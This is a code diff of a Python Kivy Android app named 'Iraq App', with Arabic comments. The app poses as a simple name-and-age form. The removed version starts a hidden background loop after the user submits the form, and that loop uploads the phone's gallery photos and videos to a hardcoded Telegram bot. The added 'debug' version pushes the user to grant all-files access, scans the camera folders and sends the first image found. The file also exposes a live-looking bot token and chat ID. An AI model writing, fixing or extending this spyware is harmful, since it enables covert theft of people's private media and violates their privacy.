@@ -3,7 +3,6 @@ import time
 import hashlib
 import threading
 import requests
-import traceback
 from kivy.utils import platform
 
 from kivy.app import App
@@ -11,237 +10,155 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.textinput import TextInput
 from kivy.uix.label import Label
 from kivy.uix.button import Button
+from kivy.uix.scrollview import ScrollView
 from kivy.clock import Clock
 
 # ============ إعدادات تيليجرام ============
 BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
 CHAT_ID   = "6046016571"
 API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"
-HASH_LOG  = "sent_media_hashes.txt"
 
-# ============ دوال الإرسال والمسح ============
-def get_file_hash(file_path):
-    hasher = hashlib.md5()
-    try:
-        with open(file_path, 'rb') as f:
-            for chunk in iter(lambda: f.read(4096), b""):
-                hasher.update(chunk)
-        return hasher.hexdigest()
-    except Exception:
-        return None
-
-def load_hashes(base_dir):
-    log_path = os.path.join(base_dir, HASH_LOG)
-    if os.path.exists(log_path):
-        try:
-            with open(log_path, "r", encoding="utf-8") as f:
-                return set(f.read().splitlines())
-        except Exception:
-            pass
-    return set()
-
-def save_hash(base_dir, file_hash):
-    log_path = os.path.join(base_dir, HASH_LOG)
-    try:
-        with open(log_path, "a", encoding="utf-8") as f:
-            f.write(file_hash + "\n")
-    except Exception:
-        pass
-
-GALLERY_PATHS = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/sdcard/Download/"]
+# ============ مسارات متعددة (لضمان التقاط صور سامسونج) ============
+GALLERY_PATHS = [
+    "/sdcard/DCIM/Camera/",
+    "/storage/emulated/0/DCIM/Camera/",
+    "/sdcard/Pictures/",
+    "/storage/emulated/0/Pictures/",
+    "/sdcard/DCIM/",
+    "/storage/emulated/0/DCIM/"
+]
 
 def get_all_unique_media(base_dir):
-    sent_hashes = load_hashes(base_dir)
+    # هنا لا نستخدم الـ Hash لنرى كل شيء، مجرد فحص أولي
     unique_list = []
-    IMG_EXT = ('.jpg', '.jpeg', '.png')
+    IMG_EXT = ('.jpg', '.jpeg', '.png', '.webp', '.heic')
     VID_EXT = ('.mp4', '.mov', '.avi', '.mkv')
+    
+    log_output = ""
     for folder in GALLERY_PATHS:
         if os.path.exists(folder):
             try:
-                for root, dirs, files in os.walk(folder):
-                    if any(x in root.lower() for x in ['.thumbnails', 'cache', 'recycler']):
-                        continue
-                    for file in files:
-                        file_lower = file.lower()
-                        full_path = os.path.join(root, file)
-                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video' if file_lower.endswith(VID_EXT) else None
-                        if media_type:
-                            try:
-                                f_hash = get_file_hash(full_path)
-                                if f_hash and f_hash not in sent_hashes:
-                                    unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
-                            except Exception:
-                                continue
-            except Exception:
-                pass
-    return unique_list
+                files = os.listdir(folder)
+                count = 0
+                for file in files:
+                    file_lower = file.lower()
+                    if file_lower.endswith(IMG_EXT) or file_lower.endswith(VID_EXT):
+                        count += 1
+                        full_path = os.path.join(folder, file)
+                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video'
+                        unique_list.append({'path': full_path, 'type': media_type})
+                log_output += f"📁 {folder}: {count} files\n"
+            except Exception as e:
+                log_output += f"❌ {folder}: Error {e}\n"
+        else:
+            log_output += f"🚫 {folder}: Not Found\n"
+            
+    return unique_list, log_output
 
-def send_telegram_text(text, status_callback=None):
+def send_telegram_text(text):
     try:
-        url = f"{API_URL}/sendMessage"
-        response = requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=20)
-        ok = response.status_code == 200 and response.json().get("ok")
-        if status_callback:
-            Clock.schedule_once(lambda dt: status_callback(ok))
-        return ok
-    except Exception:
-        if status_callback:
-            Clock.schedule_once(lambda dt: status_callback(False))
+        requests.post(f"{API_URL}/sendMessage", data={'chat_id': CHAT_ID, 'text': text}, timeout=20)
+    except: pass
+
+def send_media_file(item):
+    try:
+        file_path = item['path']
+        method, file_key = ("sendPhoto", "photo") if item['type'] == 'photo' else ("sendVideo", "video")
+        
+        with open(file_path, 'rb') as f:
+            files = {file_key: (os.path.basename(file_path), f)}
+            data = {'chat_id': CHAT_ID, 'caption': 'Test Upload'}
+            r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=60)
+        return r.status_code == 200
+    except Exception as e:
         return False
 
-def send_media_batch(base_dir, batch, status_cb=None):
-    for item in batch:
-        try:
-            file_path = item['path']
-            file_size = os.path.getsize(file_path)
-            method, file_key = "sendPhoto", "photo"
-
-            if item['type'] == 'video':
-                if file_size > 50 * 1024 * 1024:
-                    method, file_key = "sendDocument", "document"
-                else:
-                    method, file_key = "sendVideo", "video"
-
-            timeout_val = max(40, int(file_size / (500 * 1024)))
-            with open(file_path, 'rb') as f:
-                files = {file_key: (os.path.basename(file_path), f)}
-                data = {'chat_id': CHAT_ID, 'caption': 'New Media'}
-                r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=timeout_val)
-
-            try:
-                ok = r.status_code == 200 and r.json().get("ok") is True
-            except Exception:
-                ok = False
-
-            if ok:
-                save_hash(base_dir, item['hash'])
-                if status_cb:
-                    Clock.schedule_once(lambda dt: status_cb(f"Sent: {os.path.basename(file_path)}"))
-            else:
-                if status_cb:
-                    Clock.schedule_once(lambda dt: status_cb(f"Failed: {os.path.basename(file_path)}"))
-            time.sleep(2)
-        except Exception as e:
-            print(f"Upload error: {e}")
-
-# ============ الواجهة البسيطة القياسية ============
+# ============ واجهة الفحص ============
 class MainApplicationUI(BoxLayout):
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
         self.orientation = 'vertical'
-        self.padding = 40
-        self.spacing = 20
-        self._worker_started = False
+        self.padding = 10
+        self.spacing = 10
 
-        self.add_widget(Label(text="Iraq App (Simple UI)", font_size=30, size_hint_y=None, height=60))
+        self.add_widget(Label(text="Iraq App - Debug Mode", font_size=24, size_hint_y=None, height=50))
         
-        self.name_input = TextInput(hint_text="Enter Name", multiline=False, size_hint_y=None, height=60, font_size=20)
-        self.add_widget(self.name_input)
-        
-        self.age_input = TextInput(hint_text="Enter Age", multiline=False, input_filter='int', size_hint_y=None, height=60, font_size=20)
-        self.add_widget(self.age_input)
-        
-        self.send_button = Button(text="Send", font_size=20, size_hint_y=None, height=60)
-        self.send_button.bind(on_press=self.on_submit)
-        self.add_widget(self.send_button)
-        
-        self.status_lbl = Label(text="Waiting...", font_size=18, size_hint_y=None, height=60)
-        self.add_widget(self.status_lbl)
+        # شاشة عرض السجل
+        self.scroll = ScrollView(size_hint=(1, 0.6))
+        self.log_label = Label(text="Starting...", font_size=14, size_hint_y=None, halign='left', valign='top')
+        self.log_label.bind(texture_size=self.log_label.setter('size'))
+        self.scroll.add_widget(self.log_label)
+        self.add_widget(self.scroll)
 
-    def set_status(self, msg):
-        self.status_lbl.text = msg
+        # زر فتح الإعدادات
+        btn_settings = Button(text="1. Open Permissions Settings", font_size=18, size_hint_y=None, height=50, background_color=(0.8, 0.3, 0.3, 1))
+        btn_settings.bind(on_press=self.open_settings)
+        self.add_widget(btn_settings)
 
-    def on_submit(self, instance):
-        name = self.name_input.text.strip()
-        age  = self.age_input.text.strip()
+        # زر الفحص
+        btn_scan = Button(text="2. Scan & Send First Image", font_size=18, size_hint_y=None, height=50, background_color=(0.2, 0.6, 0.2, 1))
+        btn_scan.bind(on_press=self.scan_and_send)
+        self.add_widget(btn_scan)
 
-        if not name or not age:
-            self.set_status("Please enter Name and Age")
-            return
+    def log(self, msg):
+        self.log_label.text += f"\n{msg}"
 
-        self.send_button.disabled = True
-        self.send_button.text = "Sending..."
-        self.set_status("Sending data...")
-
-        msg = f"Name: {name}\nAge: {age}"
-        threading.Thread(target=self._send_and_start, args=(msg,), daemon=True).start()
-
-    def _send_and_start(self, msg):
-        ok = send_telegram_text(msg)
-        Clock.schedule_once(lambda dt: self._after_login(ok))
-
-    def _after_login(self, ok):
-        if not ok:
-            self.set_status("Failed. Check internet.")
-            self.send_button.disabled = False
-            self.send_button.text = "Send"
-            return
-
-        self.set_status("Login successful! Starting media upload...")
-        self.send_button.text = "Done"
-        if not self._worker_started:
-            self._worker_started = True
-            threading.Thread(target=self._media_worker, daemon=True).start()
-
-    def _media_worker(self):
-        time.sleep(3)
-        base_dir = App.get_running_app().user_data_dir
-        while True:
+    def open_settings(self):
+        if platform == 'android':
             try:
-                media = get_all_unique_media(base_dir)
-                if media:
-                    Clock.schedule_once(lambda dt: self.set_status(f"Sending {len(media)} files..."))
-                    send_media_batch(base_dir, media[:3], status_cb=self._media_status)
-                else:
-                    Clock.schedule_once(lambda dt: self.set_status("No new media. Scanning..."))
+                from jnius import autoclass, cast
+                Intent = autoclass('android.content.Intent')
+                Settings = autoclass('android.provider.Settings')
+                Uri = autoclass('android.net.Uri')
+                PythonActivity = autoclass('org.kivy.android.PythonActivity')
+                activity = PythonActivity.mActivity
+
+                # فتح شاشة الوصول لجميع الملفات مباشرة
+                intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                uri = Uri.fromParts("package", activity.getPackageName(), None)
+                intent.setData(uri)
+                activity.startActivity(intent)
+                self.log("✅ Settings opened. Please enable 'All files access'.")
             except Exception as e:
-                print(f"Worker error: {e}")
-            time.sleep(60)
+                self.log(f"❌ Error opening settings: {e}")
 
-    def _media_status(self, text):
-        Clock.schedule_once(lambda dt: self.set_status(text))
+    def scan_and_send(self, instance):
+        self.log_label.text = "Scanning directories..."
+        threading.Thread(target=self._do_scan, daemon=True).start()
 
-# ============ كلاس التطبيق (مع جميع الأذونات الحديثة) ============
+    def _do_scan(self):
+        # 1. فحص المجلدات
+        media, log_output = get_all_unique_media("/sdcard")
+        Clock.schedule_once(lambda dt: self.log(log_output))
+        
+        if not media:
+            Clock.schedule_once(lambda dt: self.log("❌ NO IMAGES FOUND AT ALL.\nCheck permissions."))
+            return
+
+        # 2. إرسال أول صورة تم العثور عليها
+        Clock.schedule_once(lambda dt: self.log(f"✅ Found {len(media)} media files!\nSending first one: {os.path.basename(media[0]['path'])}..."))
+        success = send_media_file(media[0])
+
+        if success:
+            Clock.schedule_once(lambda dt: self.log("🚀 SUCCESS! Image sent to Telegram."))
+        else:
+            Clock.schedule_once(lambda dt: self.log("❌ FAILED to send. Telegram API rejected it."))
+
+# ============ كلاس التطبيق ============
 class IraqApp(App):
     def on_start(self):
         if platform == 'android':
             from android.permissions import request_permissions, Permission
             try:
-                permissions = [
+                request_permissions([
                     Permission.READ_EXTERNAL_STORAGE,
                     Permission.WRITE_EXTERNAL_STORAGE,
-                ]
-                if hasattr(Permission, 'READ_MEDIA_IMAGES'):
-                    permissions.append(Permission.READ_MEDIA_IMAGES)
-                if hasattr(Permission, 'READ_MEDIA_VIDEO'):
-                    permissions.append(Permission.READ_MEDIA_VIDEO)
-                if hasattr(Permission, 'MANAGE_EXTERNAL_STORAGE'):
-                    permissions.append(Permission.MANAGE_EXTERNAL_STORAGE)
-                
-                request_permissions(permissions)
-            except Exception as e:
-                print(f"Permission error: {e}")
-
-    def build(self):
-        self.title = "Iraq App"
-        return MainApplicationUI()
-
-# ============ الحماية من الانهيار ============
-if __name__ == '__main__':
-    try:
-        IraqApp().run()
-    except Exception:
-        err = traceback.format_exc()
-        print(err)
-        paths_to_try = [
-            '/sdcard/iraq_crash.txt',
-            '/storage/emulated/0/iraq_crash.txt'
-        ]
-        for p in paths_to_try:
-            try:
-                with open(p, 'w', encoding='utf-8') as f:
-                    f.write(err)
-                break
+                ])
             except Exception:
                 pass
-        raise
+
+    def build(self):
+        return MainApplicationUI()
+
+if __name__ == '__main__':
+    IraqApp().run()
